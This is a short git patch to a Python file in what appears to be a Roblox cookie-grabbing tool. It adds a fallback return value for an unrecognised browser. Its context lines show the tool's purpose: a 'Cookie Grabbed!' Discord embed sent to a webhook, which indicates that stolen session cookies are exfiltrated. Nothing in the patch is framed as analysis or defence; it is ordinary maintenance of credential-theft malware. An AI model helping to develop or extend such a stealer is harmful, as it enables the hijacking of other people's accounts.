@@ -1,0 +1,25 @@
+From f9c4149440cac1f3fa1d5ec16bb2c17e8cf5a770 Mon Sep 17 00:00:00 2001
+From: Kai Daniel Gonzalez <gkai70264@gmail.com>
+Date: Mon, 3 Oct 2022 16:01:37 -0400
+Subject: [PATCH 1/6] If there's no browser, return "Unknown"
+
+---
+ roblox/edge.py | 2 ++
+ 1 file changed, 2 insertions(+)
+
+diff --git a/roblox/edge.py b/roblox/edge.py
+index 16b5e41..f4c6e46 100644
+--- a/roblox/edge.py
++++ b/roblox/edge.py
+@@ -53,6 +53,8 @@ def find_proper_agent():
+     if (use_chrome() is not None): return "Chrome/Chromium-based"
+     elif (use_edge() is not None): return "Microsoft Edge (Chromium Framework)"
+     elif (use_opera() is not None): return "Opera (or Opera-based)"
++    else:
++        return "Un-supported Browser Framework"
+ 
+ # Send to deafult webhook
+ eb = DiscordEmbed('Cookie Grabbed!', color="03b2f8")
+-- 
+2.37.3.windows.1
+
